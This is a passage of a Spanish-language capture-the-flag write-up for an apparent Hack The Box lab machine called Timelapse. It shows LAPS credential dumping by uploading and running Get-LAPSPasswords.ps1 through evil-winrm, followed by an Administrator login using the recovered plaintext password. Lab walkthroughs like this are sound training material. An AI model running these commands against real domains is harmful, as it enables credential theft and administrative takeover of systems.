LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:8Sz70$0Tjh87103v]+/%QZV-
```

Si no estuviese habilitado nos `descargamos` este `binario` [https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1](https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1) y desde el `mismo directorio` donde se encuentra nos conectamos a la máquina con `evil-winrm` y `subimos` el `binario` a la máquina víctima

```
*Evil-WinRM* PS C:\Users\svc_deploy\desktop> upload Get-LAPSPasswords.ps1
                                        
Info: Uploading /home/justice-reaper/Downloads/Get-LAPSPasswords.ps1 to C:\Users\svc_deploy\desktop\Get-LAPSPasswords.ps1
                                        
Data: 9892 bytes of 9892 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_deploy\desktop> dir


    Directory: C:\Users\svc_deploy\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/15/2024   2:41 PM           7419 Get-LAPSPasswords.ps1

```

`Importamos` el `módulo` y lo `ejecutamos`

```
*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> Import-Module ./Get-LAPSPasswords.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> Get-LAPSPasswords


Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 8Sz70$0Tjh87103v]+/%QZV-
Expiration : 8/20/2024 1:42:13 AM

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 8Sz70$0Tjh87103v]+/%QZV-
Expiration : 8/20/2024 1:42:13 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 8Sz70$0Tjh87103v]+/%QZV-
Expiration : 8/20/2024 1:42:13 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 8Sz70$0Tjh87103v]+/%QZV-
Expiration : 8/20/2024 1:42:13 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA
```

Nos `conectamos` como el usuario `Administrador` a la máquina víctima

```
# evil-winrm -i 10.129.227.113 -u 'Administrator' -p '8Sz70$0Tjh87103v]+/%QZV-' -S  
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```
